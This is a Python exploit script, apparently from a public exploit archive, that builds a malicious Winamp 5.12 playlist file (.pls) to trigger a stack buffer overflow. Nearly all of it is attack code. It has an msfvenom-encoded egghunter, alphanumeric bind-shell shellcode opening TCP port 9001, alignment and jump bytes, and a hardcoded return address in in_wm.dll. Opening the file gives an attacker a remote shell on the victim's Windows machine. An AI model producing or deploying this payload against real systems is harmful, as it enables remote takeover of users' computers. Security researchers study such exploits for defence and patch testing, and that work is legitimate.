# Exploit for Winamp 5.12 - Stack Buffer Overflow with Egghunter
# Author: Pal1Sec
# Tested on: Windows XP, SP3
#!/usr/bin/python
file = open("exploit.pls", "wb")

# msf-egghunter -a x86 -f raw -e W00T -b '\x00' | msfvenom -p - -a x86 --platform windows -b "\x00\x5c\x2f\x0a\x0d\x20\x2e" -e x86/shikata_ga_nai -f python -v egghunter

egghunter =  b""
egghunter += b"\xd9\xce\xba\x99\xf0\xb0\x41\xd9\x74\x24\xf4"
egghunter += b"\x5f\x29\xc9\xb1\x09\x31\x57\x17\x03\x57\x17"
egghunter += b"\x83\x5e\xf4\x52\xb4\x06\x74\x58\xc8\xc9\x34"
egghunter += b"\x0f\x5d\xd7\xe0\x62\x8f\xeb\x15\x27\xa4\xfc"
egghunter += b"\xae\x80\x74\x32\x9b\xa7\xa2\x9d\x56\x52\xe3"
egghunter += b"\x94\x7f\x5d\x1b"

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/alpha_mixed -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\x89\xe3\xdd\xc6\xd9\x73\xf4\x5e\x56\x59"
shellcode_bind += b"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode_bind += b"\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
shellcode_bind += b"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
shellcode_bind += b"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42"
shellcode_bind += b"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode_bind += b"\x79\x6c\x69\x78\x6b\x32\x77\x70\x73\x30"
shellcode_bind += b"\x47\x70\x31\x70\x4b\x39\x79\x75\x35\x61"
shellcode_bind += b"\x6f\x30\x33\x54\x4e\x6b\x76\x30\x64\x70"
shellcode_bind += b"\x6e\x6b\x63\x62\x34\x4c\x6c\x4b\x46\x32"
shellcode_bind += b"\x34\x54\x4c\x4b\x30\x72\x77\x58\x36\x6f"
shellcode_bind += b"\x4c\x77\x72\x6a\x45\x76\x44\x71\x49\x6f"
shellcode_bind += b"\x6e\x4c\x47\x4c\x30\x61\x51\x6c\x55\x52"
shellcode_bind += b"\x64\x6c\x55\x70\x69\x51\x38\x4f\x66\x6d"
shellcode_bind += b"\x76\x61\x6f\x37\x49\x72\x79\x62\x30\x52"
shellcode_bind += b"\x42\x77\x4e\x6b\x30\x52\x62\x30\x6e\x6b"
shellcode_bind += b"\x62\x6a\x55\x6c\x6e\x6b\x62\x6c\x74\x51"
shellcode_bind += b"\x72\x58\x39\x73\x50\x48\x66\x61\x58\x51"
shellcode_bind += b"\x76\x31\x6c\x4b\x71\x49\x75\x70\x46\x61"
shellcode_bind += b"\x5a\x73\x4e\x6b\x57\x39\x35\x48\x6b\x53"
shellcode_bind += b"\x56\x5a\x32\x69\x4c\x4b\x30\x34\x6e\x6b"
shellcode_bind += b"\x47\x71\x58\x56\x54\x71\x49\x6f\x6c\x6c"
shellcode_bind += b"\x6a\x61\x78\x4f\x36\x6d\x57\x71\x48\x47"
shellcode_bind += b"\x56\x58\x6d\x30\x42\x55\x59\x66\x33\x33"
shellcode_bind += b"\x61\x6d\x6c\x38\x77\x4b\x51\x6d\x65\x74"
shellcode_bind += b"\x64\x35\x68\x64\x73\x68\x4e\x6b\x63\x68"
shellcode_bind += b"\x47\x54\x35\x51\x68\x53\x33\x56\x6e\x6b"
shellcode_bind += b"\x54\x4c\x72\x6b\x6e\x6b\x32\x78\x45\x4c"
shellcode_bind += b"\x33\x31\x4a\x73\x6e\x6b\x75\x54\x4e\x6b"
shellcode_bind += b"\x46\x61\x7a\x70\x6c\x49\x70\x44\x74\x64"
shellcode_bind += b"\x56\x44\x31\x4b\x63\x6b\x53\x51\x53\x69"
shellcode_bind += b"\x43\x6a\x32\x71\x39\x6f\x6d\x30\x53\x6f"
shellcode_bind += b"\x63\x6f\x30\x5a\x6c\x4b\x36\x72\x68\x6b"
shellcode_bind += b"\x4c\x4d\x61\x4d\x53\x58\x76\x53\x54\x72"
shellcode_bind += b"\x77\x70\x37\x70\x63\x58\x71\x67\x63\x43"
shellcode_bind += b"\x54\x72\x53\x6f\x53\x64\x75\x38\x70\x4c"
shellcode_bind += b"\x63\x47\x56\x46\x76\x67\x49\x6f\x68\x55"
shellcode_bind += b"\x48\x38\x7a\x30\x46\x61\x47\x70\x47\x70"
shellcode_bind += b"\x35\x79\x79\x54\x43\x64\x66\x30\x70\x68"
shellcode_bind += b"\x61\x39\x6f\x70\x32\x4b\x57\x70\x79\x6f"
shellcode_bind += b"\x49\x45\x51\x7a\x33\x38\x76\x39\x76\x30"
shellcode_bind += b"\x49\x72\x69\x6d\x53\x70\x62\x70\x31\x50"
shellcode_bind += b"\x70\x50\x73\x58\x69\x7a\x46\x6f\x79\x4f"
shellcode_bind += b"\x6d\x30\x49\x6f\x4e\x35\x6e\x77\x32\x48"
shellcode_bind += b"\x75\x52\x73\x30\x51\x33\x66\x49\x6c\x49"
shellcode_bind += b"\x6a\x46\x52\x4a\x36\x70\x52\x76\x52\x77"
shellcode_bind += b"\x35\x38\x68\x42\x39\x4b\x77\x47\x61\x77"
shellcode_bind += b"\x69\x6f\x4a\x75\x33\x67\x50\x68\x58\x37"
shellcode_bind += b"\x7a\x49\x44\x78\x59\x6f\x59\x6f\x5a\x75"
shellcode_bind += b"\x73\x67\x32\x48\x34\x34\x38\x6c\x57\x4b"
shellcode_bind += b"\x58\x61\x49\x6f\x4a\x75\x70\x57\x6a\x37"
shellcode_bind += b"\x45\x38\x54\x35\x70\x6e\x30\x4d\x51\x71"
shellcode_bind += b"\x49\x6f\x4a\x75\x50\x68\x53\x53\x52\x4d"
shellcode_bind += b"\x75\x34\x37\x70\x4b\x39\x4b\x53\x31\x47"
shellcode_bind += b"\x71\x47\x42\x77\x46\x51\x48\x76\x70\x6a"
shellcode_bind += b"\x42\x32\x71\x49\x51\x46\x7a\x42\x49\x6d"
shellcode_bind += b"\x61\x76\x39\x57\x61\x54\x66\x44\x67\x4c"
shellcode_bind += b"\x36\x61\x67\x71\x6c\x4d\x57\x34\x71\x34"
shellcode_bind += b"\x76\x70\x58\x46\x75\x50\x52\x64\x61\x44"
shellcode_bind += b"\x56\x30\x50\x56\x62\x76\x36\x36\x33\x76"
shellcode_bind += b"\x31\x46\x62\x6e\x73\x66\x36\x36\x50\x53"
shellcode_bind += b"\x76\x36\x70\x68\x71\x69\x4a\x6c\x35\x6f"
shellcode_bind += b"\x6b\x36\x49\x6f\x38\x55\x4e\x69\x39\x70"
shellcode_bind += b"\x50\x4e\x70\x56\x47\x36\x59\x6f\x70\x30"
shellcode_bind += b"\x65\x38\x65\x58\x6c\x47\x35\x4d\x61\x70"
shellcode_bind += b"\x79\x6f\x6e\x35\x4d\x6b\x59\x70\x77\x6d"
shellcode_bind += b"\x76\x4a\x77\x7a\x55\x38\x6c\x66\x6c\x55"
shellcode_bind += b"\x4f\x4d\x4f\x6d\x39\x6f\x4e\x35\x35\x6c"
shellcode_bind += b"\x77\x76\x63\x4c\x47\x7a\x6d\x50\x39\x6b"
shellcode_bind += b"\x39\x70\x54\x35\x44\x45\x6f\x4b\x67\x37"
shellcode_bind += b"\x32\x33\x32\x52\x42\x4f\x71\x7a\x55\x50"
shellcode_bind += b"\x46\x33\x79\x6f\x79\x45\x41\x41"

align   = "\x83\xC4\x58\x83\xC4\x58"
esp_adj = "\x89\xFC\x66\x81\xEC\xEA\x02" # MOV ESP, EDI # SUB SP, 0x2EA 
nops    = "\x90" * 28

header1 = "[playlist]\r\nFile1=\\\\"
tag     = "W00TW00T"
stage1  = "\x90" * (856-len(tag+shellcode_bind+nops+esp_adj))
stage2  = "\xcc" * (166-len(align+egghunter))
eip     = "\x0e\x51\x60\x66"  # 0x6660510e push esp + ret in in_wm.dll
jmp     = ("\x83\xec\x58"     # SUB ESP, 0x58
		       "\x83\xec\x58"     # SUB ESP, 0x58
		       "\xFF\xE4"         # jmp esp -> jmp 176 back
		       "\x90\x90\x90")

header2 = "\r\nTitle1=pwnd\r\nLenght1=512\r\nNumberofEntries=1\r\n\Version=2\r\n"

buffer = header1 + tag + esp_adj + nops + shellcode_bind + stage1 + align + egghunter + stage2 + eip + jmp + header2

file.write(buffer)
file.close()
